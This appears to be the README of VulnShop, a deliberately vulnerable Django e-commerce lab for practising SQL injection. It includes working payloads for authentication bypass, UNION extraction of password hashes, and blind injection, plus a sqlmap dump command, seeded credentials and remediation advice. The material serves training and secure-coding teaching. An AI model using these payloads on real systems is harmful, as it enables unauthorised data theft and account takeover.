# VulnShop — SQL Injection Practice Lab

A deliberately vulnerable e-commerce web application built with Django (Python), HTML/CSS/JS, and SQLite (MySQL optional). It is designed exclusively for learning, teaching, and practicing SQL injection detection and exploitation in a safe, self-hosted environment — e.g., for penetration testing training, security courses, and CTF-style labs.

> ⚠️ Disclaimer: This application contains _intentional, severe security vulnerabilities_. Deploy it only on your local machine or an isolated lab network. Never expose it to the internet or point it at any system you are not explicitly authorized to test. The authors accept no liability for misuse.

---

## 📋 Table of Contents

- [Features](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-features)
- [Vulnerabilities Included](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-vulnerabilities-included)
- [Tech Stack](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-tech-stack)
- [Project Structure](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-project-structure)
- [Installation](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-installation)
- [Running the App](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-running-the-app)
- [Seeded Users](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-seeded-users)
- [Practice Targets & Payloads](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-practice-targets--payloads)
- [Vulnerable vs. Safe Comparison](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-vulnerable-vs-safe-comparison)
- [Suggested Learning Exercises](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-suggested-learning-exercises)
- [Recommended Tools](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-recommended-tools)
- [How the Vulnerabilities Work](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-how-the-vulnerabilities-work)
- [Remediation Reference](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-remediation-reference)
- [Troubleshooting](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-troubleshooting)
- [License](https://hackerai.co/c/67372857-4bc0-4957-a435-37b26f9509bc#-license)

---

## ✨ Features

- Full user system with real Django sessions (registration, login, profile)
- Product catalog with search, detail pages, and comments
- Vulnerable endpoints demonstrating classic SQL injection classes:
    - Authentication bypass
    - UNION-based data extraction
    - Boolean-blind and time-based blind injection
    - Error-based disclosure (raw DB errors returned to client)
    - Numeric (URL parameter) injection
- A safe twin endpoint (`/safe-search/`) using parameterized queries for side-by-side comparison
- Seeded demo data (users, products, comments) via a management command
- Clean, minimal HTML/CSS UI — no frontend build step required

---

## 🐞 Vulnerabilities Included

| #   | Endpoint         | Vulnerability Class                                    | Root Cause                                               |
| --- | ---------------- | ------------------------------------------------------ | -------------------------------------------------------- |
| 1   | `/login/`        | Authentication bypass                                  | Credentials concatenated directly into a raw SQL query   |
| 2   | `/login/`        | Error-based disclosure                                 | Raw database exceptions rendered to the client           |
| 3   | `/` (search)     | UNION-based extraction                                 | `q` parameter f-stringed into the `WHERE` clause         |
| 4   | `/` (search)     | Blind injection (boolean/time)                         | Same as above; responses differ based on condition truth |
| 5   | `/product/<id>/` | Numeric injection                                      | URL parameter interpolated without validation            |
| 6   | `/profile/?id=`  | IDOR-style injection / data enumeration                | Attacker-controlled user ID in raw SQL                   |
| 7   | `/safe-search/`  | ✅ Safe — parameterized query (control group for demos) | —                                                        |
|     |                  |                                                        |                                                          |

---

## 🛠 Tech Stack

- Backend: Python 3.10+, Django 4.2
- Database: SQLite (default) or MySQL (optional, configurable)
- Frontend: HTML, CSS (inline in `base.html`), vanilla JS
- Auth: Django's built-in `auth_user` model

---

## 📁 Project Structure

```
vulnshop/
├── manage.py
├── requirements.txt
├── vulnshop/
│   ├── settings.py
│   ├── urls.py
│   └── wsgi.py
└── shop/
    ├── models.py
    ├── views.py
    ├── urls.py
    ├── admin.py
    ├── management/
    │   └── commands/
    │       └── seed.py
    └── templates/shop/
        ├── base.html
        ├── login.html
        ├── products.html
        ├── product_detail.html
        ├── profile.html
        └── fixed_search.html
```

---

## 🚀 Installation

### 1. Clone and enter the project

bash

```
git clone https://github.com/<your-username>/vulnshop.git
cd vulnshop
```

### 2. Create a virtual environment

bash

```
python -m venv venv
source venv/bin/activate        # Linux/macOS
# venv\Scripts\activate         # Windows
```

### 3. Install dependencies

bash

```
pip install -r requirements.txt
```

`requirements.txt`:

```
Django>=4.2,<5.0
```

### 4. (Optional) Switch to MySQL

Edit `vulnshop/settings.py`:

python

```
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'vulnshop',
        'USER': 'root',
        'PASSWORD': 'root',
        'HOST': '127.0.0.1',
        'PORT': '3306',
    }
}
```

Requires `pip install mysqlclient` and a running MySQL server. Using MySQL also enables `SLEEP()`-based time-blind payloads, which SQLite does not support.

---

## ▶️ Running the App

bash

```
python manage.py migrate       # create tables
python manage.py seed          # insert demo users & products
python manage.py runserver     # start on http://127.0.0.1:8000
```

Optional: create a Django admin account for `/admin/`:

bash

```
python manage.py createsuperuser
```

---

## 👤 Seeded Users

Created by `python manage.py seed`:

|Username|Password|Role|
|---|---|---|
|`admin`|`S3cr3tAdmin!`|Superuser|
|`alice`|`AlicePass123`|Regular user|
|`bob`|`BobPass456`|Regular user|
|`eve`|`EvilPass789`|Regular user|

Passwords are stored as Django PBKDF2 hashes — useful for teaching why even leaked hashes are not plaintext (and why `UNION` extraction returns `$pbkdf2-sha256$...` strings).

---

## 🎯 Practice Targets & Payloads

> Tip: URL-encode payloads when pasting into a browser, or use `curl` / Burp Suite Repeater to send them raw.

### 1. Search — dump all products (tautology)

```
http://127.0.0.1:8000/?q=%' OR '1'='1' -- 
```

→ Returns every product instead of matching ones.

### 2. Search — UNION extraction of user credentials

```
http://127.0.0.1:8000/?q=%' UNION SELECT id, username, password, 'x' FROM auth_user --
```

→ Table shows all usernames and password hashes.

### 3. Search — blind injection detection

Boolean:

```
%' AND 1=1 --    → normal (true)
%' AND 1=2 --    → empty results (false)
```

Time-based (MySQL only):

```
%' AND SLEEP(5) --    → response delayed ~5s
```

SQLite alternative (heavy computation delay):

```
%' AND 1=randomblob(200000000) --
```

### 4. Login — authentication bypass

Username: `admin' --` Password: _anything_ → Logged in as `admin` without knowing the password.

### 5. Product detail — numeric injection

```
http://127.0.0.1:8000/product/1%20OR%201=1/
```

→ Returns the first product regardless of ID.

### 6. Profile — user enumeration (must be logged in)

```
http://127.0.0.1:8000/profile/?id=1 UNION SELECT id,username,first_name,email FROM auth_user WHERE id=2
```

→ Displays another user's data.

### 7. Safe search — verify payloads fail

```
http://127.0.0.1:8000/safe-search/?q=%' OR '1'='1' --
```

→ Payload is treated as literal search text. No injection. This is the fix demonstration.

---

## ⚖️ Vulnerable vs. Safe Comparison

Same feature, two implementations — the core teaching moment of the lab:

python

```
# VULNERABLE (views.py — vuln_search)
sql = f"SELECT id, name, price, category FROM shop_product WHERE name LIKE '%{q}%' ..."
cur.execute(sql)                      # input changes query structure!

# SAFE (views.py — fixed_search)
sql = "SELECT id, name, price, category FROM shop_product WHERE name LIKE %s OR description LIKE %s"
cur.execute(sql, [f'%{q}%', f'%{q}%'])  # input is always data, never code
```

Run identical payloads against both endpoints and observe that only the vulnerable one is exploitable.

---

## 📚 Suggested Learning Exercises

1. Detect — confirm injection on `/` using tautology and error messages, without any tooling.
2. Enumerate — use `UNION SELECT` with `ORDER BY n` / NULL-counting to discover column counts, then dump `auth_user`.
3. Blind extraction — extract `admin`'s password hash character-by-character using boolean conditions (`SUBSTRING`).
4. Bypass auth — log in as `admin` via the login form.
5. Escalate — chain the profile injection to read other users' emails.
6. Fix & verify — rewrite `vuln_search` using the parameterized pattern from `fixed_search`; re-run your payloads and confirm failure.
7. Tool practice — run `sqlmap` against the search endpoint (see below) and compare automated results with your manual findings.

---

## 🔧 Recommended Tools

|Tool|Purpose|
|---|---|
|Burp Suite (Community)|Intercepting/repeating requests, fuzzing|
|sqlmap|Automated injection detection & extraction|
|curl / httpie|Quick manual payload testing|
|ffuf / wfuzz|Endpoint & parameter fuzzing|
|OWASP ZAP|Scanner baseline + fuzzer|

Example sqlmap run against the search endpoint:

bash

```
sqlmap -u "http://127.0.0.1:8000/?q=test" --level=3 --risk=2 --batch --dump
```

---

## 🧠 How the Vulnerabilities Work

All flaws share one root cause: user input is concatenated into SQL strings instead of being passed as parameters. When the database parses the combined string, attacker-supplied characters like `'` escape the intended data context and let the attacker inject new SQL syntax (`OR`, `UNION`, `--` comments, stacked conditions). The vulnerable views also render raw database exceptions, leaking schema and version details that accelerate exploitation.

---

## 🩹 Remediation Reference

For fixing the lab (or teaching secure coding):

1. Parameterized queries — always pass user input as query parameters (see `fixed_search`).
2. ORM usage — prefer Django's ORM (`Product.objects.filter(name__icontains=q)`) over raw SQL.
3. No raw error leakage — return generic error messages; log details server-side.
4. Validate & allow-list — cast numeric parameters with `int()` before use.
5. Least privilege — run the app's DB user with minimal permissions.
6. `DEBUG = False` in production — never expose tracebacks.

## 📄 License

MIT License — use freely for education and authorized training. You are responsible for ensuring this software is never deployed against systems you do not own or have written authorization to test.



## Developed In Samo Tech Labs
## by:
https://github.com/blackwolf-274/vulnshop
